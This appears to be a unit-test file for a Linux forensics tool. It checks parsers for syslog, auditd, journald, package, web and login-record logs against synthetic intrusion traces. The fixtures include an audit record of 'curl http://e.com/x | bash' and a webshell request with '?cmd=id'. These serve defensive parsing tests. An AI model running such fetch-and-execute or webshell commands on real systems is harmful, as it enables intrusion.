"""Unit tests for step-7b parsers: syslog_kern, auditd, journald,
package_logs, web_logs, wtmp_btmp_lastlog."""

from __future__ import annotations

import struct
from datetime import UTC, datetime

from conftest import make_mini_evidence

from linuxdfir.ingest import Evidence
from linuxdfir.parsers import (
    auditd,
    journald,
    live_processes,
    package_logs,
    syslog_kern,
    web_logs,
    wtmp_btmp_lastlog,
)
from linuxdfir.parsers.wtmp_btmp_lastlog import (
    LASTLOG_FMT_32,
    LASTLOG_FMT_64,
    UTMP_FMT,
)

EPOCH_JAN2_0112_UTC = int(datetime(2026, 1, 2, 1, 12, 44, tzinfo=UTC).timestamp())


def _parse(parser, tmp_path, files, member):
    root = make_mini_evidence(tmp_path / "mini", files=files)
    with Evidence.open(root) as evidence:
        return list(parser.parse_member(evidence, member))


def _utmp(ut_type, user, host, epoch, line="pts/0", pid=1000):
    line_b = line.encode()[:32]
    return struct.pack(
        UTMP_FMT, ut_type, pid, line_b, line_b[-4:], user.encode()[:32], host.encode()[:256],
        0, 0, 0, epoch, 0, 0, 0, 0, 0,
    )


# ------------------------------------------------------------ syslog_kern


class TestSyslogKern:
    def test_traditional_line(self, tmp_path):
        events = _parse(
            syslog_kern,
            tmp_path,
            {"/var/log/syslog": b"Jan  2 03:12:44 web01 sshd[4150]: Accepted password for root\n"},
            "evidence/var/log/syslog",
        )
        assert len(events) == 1
        assert events[0].timestamp_utc == datetime(2026, 1, 2, 1, 12, 44, tzinfo=UTC)
        assert events[0].timestamp_quality == "inferred_year"

    def test_iso_line(self, tmp_path):
        events = _parse(
            syslog_kern,
            tmp_path,
            {"/var/log/syslog": b"2026-01-02T03:12:44+0200 web01 sshd[4150]: Accepted password\n"},
            "evidence/var/log/syslog",
        )
        assert len(events) == 1
        assert events[0].timestamp_quality == "exact"

    def test_cron_command(self, tmp_path):
        events = _parse(
            syslog_kern,
            tmp_path,
            {"/var/log/syslog": b"Jan  2 03:15:00 web01 CRON[4200]: (root) CMD (/tmp/.x/run.sh)\n"},
            "evidence/var/log/syslog",
        )
        assert events[0].event_type == "cron_command"
        assert events[0].user == "root"

    def test_kernel_module(self, tmp_path):
        blob = b"Jan  2 03:21:10 web01 kernel: [184270.65] hid_x: loading out-of-tree module taints kernel.\n"
        events = _parse(syslog_kern, tmp_path, {"/var/log/kern.log": blob}, "evidence/var/log/kern.log")
        assert events[0].event_type == "kernel_module"
        assert events[0].message.startswith("kernel module hid_x:")

    def test_kernel_oom(self, tmp_path):
        blob = b"Jan  2 03:21:10 web01 kernel: [184270.65] Out of memory: Killed process 123 (evil)\n"
        events = _parse(syslog_kern, tmp_path, {"/var/log/kern.log": blob}, "evidence/var/log/kern.log")
        assert events[0].event_type == "kernel_oom"

    def test_kernel_usb(self, tmp_path):
        events = _parse(
            syslog_kern,
            tmp_path,
            {"/var/log/kern.log": b"Jan  2 03:21:10 web01 kernel: [184270.65] usb 1-1: new high-speed USB device\n"},
            "evidence/var/log/kern.log",
        )
        assert events[0].event_type == "kernel_usb"

    def test_repeated_line(self, tmp_path):
        blob = (
            b"Jan  2 03:12:44 web01 sshd[4150]: Failed password for root\n"
            b"Jan  2 03:12:44 web01 sshd[4150]: last message repeated 2 times\n"
        )
        events = _parse(syslog_kern, tmp_path, {"/var/log/syslog": blob}, "evidence/var/log/syslog")
        assert len(events) == 1
        assert events[0].repeat_count == 3

    def test_malformed(self, tmp_path):
        events = _parse(
            syslog_kern, tmp_path, {"/var/log/syslog": b"this is not a syslog line\n"},
            "evidence/var/log/syslog",
        )
        assert events[0].event_type == "unparsed"

    def test_kernel_module_helper(self):
        info = syslog_kern.parse_kernel_module_message("kernel module hid_x: loading out-of-tree")
        assert info == {"name": "hid_x", "detail": "loading out-of-tree"}
        assert syslog_kern.parse_kernel_module_message("nope") is None


# ----------------------------------------------------------------- auditd


class TestAuditd:
    AUDIT_BLOB = (
        b'type=SYSCALL msg=audit(1767318770.123:45): arch=c000003e syscall=59 success=yes exit=0 '
        b'a0=7ffc0000 ppid=4150 pid=4152 auid=0 uid=0 gid=0 euid=0 comm="bash" exe="/usr/bin/bash"\n'
        b'type=EXECVE msg=audit(1767318770.123:45): argc=3 a0="bash" a1="-c" a2="curl http://e.com/x | bash"\n'
        b'type=PATH msg=audit(1767318806.456:52): item=0 name="/tmp/.x/x" nametype=NORMAL\n'
    )

    def test_group_and_exec(self, tmp_path):
        events = _parse(auditd, tmp_path, {"/var/log/audit/audit.log": self.AUDIT_BLOB},
                        "evidence/var/log/audit/audit.log")
        by_type = {}
        for event in events:
            by_type.setdefault(event.event_type, []).append(event)
        assert len(by_type["audit_event"]) == 2
        assert len(by_type["audit_exec"]) == 1
        assert by_type["audit_event"][0].timestamp_quality == "exact"
        assert "curl http://e.com/x | bash" in by_type["audit_exec"][0].message

    def test_hex_arg_decoded(self, tmp_path):
        blob = b'type=EXECVE msg=audit(1767318770.123:45): argc=2 a0=62617368 a1="x"\n'
        events = _parse(auditd, tmp_path, {"/var/log/audit/audit.log": blob},
                        "evidence/var/log/audit/audit.log")
        execs = [e for e in events if e.event_type == "audit_exec"]
        assert execs and "bash x" in execs[0].message

    def test_user_login(self, tmp_path):
        blob = b'type=USER_LOGIN msg=audit(1767318770.123:60): pid=4150 uid=0 auid=0 acct="root" exe="/usr/sbin/sshd"\n'
        events = _parse(auditd, tmp_path, {"/var/log/audit/audit.log": blob},
                        "evidence/var/log/audit/audit.log")
        auths = [e for e in events if e.event_type == "audit_auth"]
        assert auths and auths[0].user == "root"

    def test_malformed_line(self, tmp_path):
        events = _parse(auditd, tmp_path, {"/var/log/audit/audit.log": b"not an audit line\n"},
                        "evidence/var/log/audit/audit.log")
        assert events == []

    def test_exec_helper(self):
        info = auditd.parse_audit_exec_message("audit exec pid=4152 auid=0: bash -c id")
        assert info == {"pid": "4152", "auid": "0", "argv": "bash -c id"}
        assert auditd.parse_audit_exec_message("nope") is None


# --------------------------------------------------------------- journald


class TestJournald:
    def test_short_iso(self, tmp_path):
        blob = b"2026-01-02T03:12:44+0200 web01 sshd[4150]: Accepted password for root\n"
        events = _parse(journald, tmp_path, {"live/journalctl_export.txt": blob},
                        "evidence/live/journalctl_export.txt")
        assert len(events) == 1
        assert events[0].event_type == "journal_entry"
        assert events[0].timestamp_utc == datetime(2026, 1, 2, 1, 12, 44, tzinfo=UTC)

    def test_markers_skipped(self, tmp_path):
        blob = (
            b"-- Logs begin at Thu 2026-01-01 00:00:05 EET --\n"
            b"2026-01-02T03:12:44+0200 web01 kernel: hello\n"
        )
        events = _parse(journald, tmp_path, {"live/journalctl_export.txt": blob},
                        "evidence/live/journalctl_export.txt")
        assert len(events) == 1

    def test_malformed(self, tmp_path):
        events = _parse(journald, tmp_path, {"live/journalctl_export.txt": b"garbage line\n"},
                        "evidence/live/journalctl_export.txt")
        assert events[0].event_type == "unparsed"


# ------------------------------------------------------------ package_logs


class TestPackageLogs:
    def test_dpkg_install(self, tmp_path):
        events = _parse(
            package_logs, tmp_path,
            {"/var/log/dpkg.log": b"2026-01-02 03:20:11 install netcat-traditional:amd64 1.10-41.1 1.10-41.1\n"},
            "evidence/var/log/dpkg.log",
        )
        assert len(events) == 1
        assert events[0].event_type == "package_install"
        assert events[0].timestamp_quality == "tz_assumed"
        info = package_logs.parse_package_message(events[0].message)
        assert info["name"] == "netcat-traditional"

    def test_dpkg_status_skipped(self, tmp_path):
        events = _parse(
            package_logs, tmp_path,
            {"/var/log/dpkg.log": b"2026-01-02 06:25:01 startup archives unpack\n"},
            "evidence/var/log/dpkg.log",
        )
        assert events == []

    def test_dpkg_remove(self, tmp_path):
        events = _parse(
            package_logs, tmp_path,
            {"/var/log/dpkg.log": b"2026-01-02 03:20:11 remove oldpkg:amd64 1.0\n"},
            "evidence/var/log/dpkg.log",
        )
        assert events[0].event_type == "package_remove"

    def test_apt_history(self, tmp_path):
        blob = (
            b"Start-Date: 2026-01-02  06:25:01\n"
            b"Commandline: apt install nmap netcat\n"
            b"Install: nmap:amd64 (7.93-1), netcat-traditional:amd64 (1.10-41.1)\n"
            b"End-Date: 2026-01-02  06:25:09\n"
        )
        events = _parse(package_logs, tmp_path, {"/var/log/apt/history.log": blob},
                        "evidence/var/log/apt/history.log")
        assert len(events) == 2
        assert all(e.event_type == "package_install" for e in events)

    def test_yum_installed(self, tmp_path):
        events = _parse(
            package_logs, tmp_path,
            {"/var/log/yum.log": b"Jan 02 03:20:11 Installed: nmap-7.93-1.x86_64\n"},
            "evidence/var/log/yum.log",
        )
        assert len(events) == 1
        assert events[0].timestamp_quality == "inferred_year"

    def test_dnf_line(self, tmp_path):
        events = _parse(
            package_logs, tmp_path,
            {"/var/log/dnf.rpm.log": b"2026-01-02T03:20:11+0200 INFO Installed: socat-1.7.4.x86_64\n"},
            "evidence/var/log/dnf.rpm.log",
        )
        assert len(events) == 1
        assert events[0].event_type == "package_install"

    def test_malformed(self, tmp_path):
        events = _parse(
            package_logs, tmp_path, {"/var/log/dpkg.log": b"garbage\n"},
            "evidence/var/log/dpkg.log",
        )
        assert events[0].event_type == "unparsed"


# --------------------------------------------------------------- web_logs


class TestWebLogs:
    def test_nginx_combined(self, tmp_path):
        blob = (
            b'203.0.113.9 - - [02/Jan/2026:03:20:11 +0200] "GET /wp-content/uploads/shell.php?cmd=%69%64 '
            b'HTTP/1.1" 200 512 "-" "Mozilla/5.0"\n'
        )
        events = _parse(web_logs, tmp_path, {"/var/log/nginx/access.log": blob},
                        "evidence/var/log/nginx/access.log")
        assert len(events) == 1
        assert events[0].event_type == "web_request"
        assert "?cmd=id" in events[0].message
        assert events[0].timestamp_quality == "exact"
        info = web_logs.parse_web_message(events[0].message)
        assert info["method"] == "GET" and info["status"] == 200 and info["ip"] == "203.0.113.9"

    def test_common_no_ua(self, tmp_path):
        blob = b'10.0.0.7 - - [02/Jan/2026:09:15:02 +0200] "GET /index.html HTTP/1.1" 200 612\n'
        events = _parse(web_logs, tmp_path, {"/var/log/nginx/access.log": blob},
                        "evidence/var/log/nginx/access.log")
        assert len(events) == 1
        assert events[0].event_type == "web_request"

    def test_nginx_error(self, tmp_path):
        blob = b'2026/01/02 03:20:12 [error] 1234#0: *42 FastCGI sent in stderr: "x" client: 203.0.113.9\n'
        events = _parse(web_logs, tmp_path, {"/var/log/nginx/error.log": blob},
                        "evidence/var/log/nginx/error.log")
        assert len(events) == 1
        assert events[0].event_type == "web_error"
        assert "client=203.0.113.9" in events[0].message

    def test_apache_error(self, tmp_path):
        blob = b'[Fri Jan 02 03:20:12.123456 2026] [php:error] [pid 1:tid 2] [client 203.0.113.9:1] script not found\n'
        events = _parse(web_logs, tmp_path, {"/var/log/apache2/error.log": blob},
                        "evidence/var/log/apache2/error.log")
        assert len(events) == 1
        assert events[0].event_type == "web_error"

    def test_malformed(self, tmp_path):
        events = _parse(web_logs, tmp_path, {"/var/log/nginx/access.log": b"garbage line here\n"},
                        "evidence/var/log/nginx/access.log")
        assert events[0].event_type == "unparsed"


# -------------------------------------------------------- wtmp_btmp_lastlog


class TestWtmpBtmpLastlog:
    def test_wtmp_login_logout_boot(self, tmp_path):
        blob = (
            _utmp(2, "reboot", "~", EPOCH_JAN2_0112_UTC - 90000, line="~", pid=0)
            + _utmp(7, "root", "203.0.113.9", EPOCH_JAN2_0112_UTC)
            + _utmp(8, "root", "203.0.113.9", EPOCH_JAN2_0112_UTC + 100)
        )
        events = _parse(wtmp_btmp_lastlog, tmp_path, {"/var/log/wtmp": blob}, "evidence/var/log/wtmp")
        assert [e.event_type for e in events] == ["wtmp_boot", "wtmp_login", "wtmp_logout"]
        assert events[1].user == "root"
        assert "03:12" in events[1].message

    def test_btmp_failure(self, tmp_path):
        blob = _utmp(6, "root", "203.0.113.9", EPOCH_JAN2_0112_UTC, line="ssh")
        events = _parse(wtmp_btmp_lastlog, tmp_path, {"/var/log/btmp": blob}, "evidence/var/log/btmp")
        assert len(events) == 1
        assert events[0].event_type == "btmp_failure"
        info = wtmp_btmp_lastlog.parse_login_message(events[0].message)
        assert info["user"] == "root" and info["ip"] == "203.0.113.9" and info["hour"] == 3

    def test_truncated_tail_counted(self, tmp_path):
        blob = _utmp(7, "root", "203.0.113.9", EPOCH_JAN2_0112_UTC) + b"\x00" * 100
        root = make_mini_evidence(tmp_path / "mini", files={"/var/log/wtmp": blob})
        with Evidence.open(root) as evidence:
            stats: dict = {}
            events = list(wtmp_btmp_lastlog.parse_member(evidence, "evidence/var/log/wtmp", stats=stats))
        assert len(events) == 1
        assert stats["corrupt"] == 1

    def test_garbage_record_skipped(self, tmp_path):
        blob = b"\xff" * 384
        root = make_mini_evidence(tmp_path / "mini", files={"/var/log/wtmp": blob})
        with Evidence.open(root) as evidence:
            stats = {}
            events = list(wtmp_btmp_lastlog.parse_member(evidence, "evidence/var/log/wtmp", stats=stats))
        assert events == []
        assert stats["corrupt"] == 1

    def test_empty_file(self, tmp_path):
        events = _parse(wtmp_btmp_lastlog, tmp_path, {"/var/log/btmp": b""}, "evidence/var/log/btmp")
        assert events == []

    def test_lastlog_64bit(self, tmp_path):
        rec0 = struct.pack(LASTLOG_FMT_64, EPOCH_JAN2_0112_UTC, b"pts/1", b"203.0.113.9")
        rec1 = struct.pack(LASTLOG_FMT_64, 0, b"", b"")
        events = _parse(wtmp_btmp_lastlog, tmp_path, {"/var/log/lastlog": rec0 + rec1},
                        "evidence/var/log/lastlog")
        assert len(events) == 1
        assert events[0].event_type == "lastlog_entry"
        info = wtmp_btmp_lastlog.parse_login_message(events[0].message)
        assert info["uid"] == 0 and info["ip"] == "203.0.113.9"

    def test_lastlog_32bit(self, tmp_path):
        rec = struct.pack(LASTLOG_FMT_32, EPOCH_JAN2_0112_UTC, b"pts/0", b"10.0.0.7")
        events = _parse(wtmp_btmp_lastlog, tmp_path, {"/var/log/lastlog": rec},
                        "evidence/var/log/lastlog")
        assert len(events) == 1


# ----------------------------------------------------------- live_processes


class TestLiveProcesses:
    PS_BLOB = (
        b"USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\n"
        b"root 1 0.0 0.1 166484 11832 ? Ss Jan01 0:04 /sbin/init\n"
        b"root 4152 0.0 0.0 11512 3400 pts/1 Ss 03:12 0:00 /tmp/.x/x --daemon\n"
    )

    def test_basic(self, tmp_path):
        events = _parse(live_processes, tmp_path, {"live/ps_auxf.txt": self.PS_BLOB},
                        "evidence/live/ps_auxf.txt")
        assert len(events) == 2
        assert events[0].event_type == "process"
        assert events[0].user == "root"
        assert events[0].timestamp_utc is None
        info = live_processes.parse_process_message(events[1].message)
        assert info == {"user": "root", "pid": 4152, "command": "/tmp/.x/x --daemon"}

    def test_malformed(self, tmp_path):
        events = _parse(live_processes, tmp_path, {"live/ps_auxf.txt": b"short line\n"},
                        "evidence/live/ps_auxf.txt")
        assert events[0].event_type == "unparsed"

    def test_helper_rejects(self):
        assert live_processes.parse_process_message("nope") is None
